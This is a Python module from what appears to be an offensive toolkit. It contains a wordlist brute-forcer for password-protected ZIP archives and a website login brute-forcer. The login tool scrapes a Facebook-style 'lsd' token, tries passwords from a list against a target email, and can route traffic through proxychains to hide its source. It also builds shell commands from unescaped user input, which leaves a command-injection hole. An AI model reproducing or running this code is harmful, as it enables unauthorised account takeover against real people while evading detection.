import requests
import Setup.setup as setup
import Includes.includes as includes
from bs4 import BeautifulSoup
from zipfile import ZipFile
import json
import os
import sys

def passFile_input_descriptio():
	'''
	Prints information about the password file
	:return: void
	'''
	print('Input a password file (leave blanck if you want to use the default file: %s%spasswords.txt' % (dir, slash))
	print('\tThe password file will be searched in the %s directory' % dir)
	print('\tIf you want to select it from the current directory or specify a specific path to the file, add the "-d" argument')
	print('\t\tExample:\n\t\t <pasword file> -d')

def zip_bruteForce():
	'''
    Zip password Bruteforcer
    :return: void
    '''
	try:
		zipArchive = ZipFile(input('Protected archive:'))
		passFile_input_descriptio()
		passFile = input("Password file:")
		found = ""
	except:
		print('error')
		sys.exit(0)

	if passFile == '':
		passFile = dir+slash+'passwords.txt'
	elif passFile != "" and "-d" not in passFile:
		passFile = dir+slash+passFile

	with open(passFile, "r") as f:
		for line in f:
			password = line.strip("\n")
			password = password.encode("utf-8")

			try:
				found = zipArchive.extractall(pwd=password)
				if found == None:
					print("[+] Password found ", password.decode())
			except RuntimeError:
				pass
		if found == "":
			print("[-] Password not found")


def create_form(headers,url):
	form=dict()
	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

	data=requests.get(url,headers=headers)
	for i in data.cookies:
		cookie[i.name]=i.value
	data=BeautifulSoup(data.text,'html.parser').form
	if data.input['name']=='lsd':
		form['lsd']=data.input['value']
	return (form,cookie)

def function(email,passw,i,headers,url, proxychains):
	'''
	Sends the data to the login page
	:param 	 	email: 			str
	:param 	 	passw: 			str
	:param 	 	i: 				int
	:param 	 	headers: 		dict
	:param 	 	url: 			str
	:param   	proxychains: 	int
	:return: 	True/False: 	boolean
	'''
	global payload,cookie

	payload = {}
	cookie = {}
	data = {}
	if i%10==1:
		payload,cookie=create_form(headers,url)
		payload['email']=email
	payload['pass']=passw

	data['payload'] =payload
	data['headers'] = headers
	data['cookie'] = cookie
	data_json = str(json.dumps(data))
	script = "modules%sAttack%sBruteForce%srun.py" % (slash,slash,slash)
	cmd = "python%s %s -u %s -d '%s'" % (setup.pythonVersion, script, url, data_json)
	if proxychains == 1:
		cmd = "proxychains python%s run.py -u %s -d '%s'" % (setup.pythonVersion, url, data_json)
	result = os.system(cmd)
	if result == 0:
		print("Password found: ", passw)
		return True
	else:
		return False

def run():
	'''
	Starts the bruteforce attack
	:return: void
	'''
	global slash, dir
	slash = includes.command(setup.commands,'slash')
	dir = 'data%sBruteForce' % slash

	print('''BruteForce for websites
		Can run with proxychains for linux users, to use the functionality
		edit to "On" the value of the proxychains variable in the Setup/setup.py file''')
	proxychains = 0
	if os.name != "nt":
		proxychains = includes.check_proxychains(proxychains)

	inputURL = str(input('url: '))
	url, name = includes.construct_url(inputURL)

	headers = {
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
	}
	payload={}
	cookie={}

	passFile_input_descriptio()
	passFile = str(input('password file: '))
	if passFile == '':
		passFile = dir+slash+'passwords.txt'
	elif '-d' in passFile:
		print("Taking the password file from the spicified path")
	else:
		passFile = dir+slash+passFile

	file = open(passFile,'r')
	email=input('Email/Username : ')

	print("\nTarget Email ID : ",email)
	print("\nTrying Passwords from list %s ..." % passFile)

	i=0
	while file:
		passw=file.readline().strip()
		i+=1
		if len(passw) < 6:
			continue
		print(str(i) +" : ",passw)
		if function(email,passw,i, headers, url, proxychains):
			break
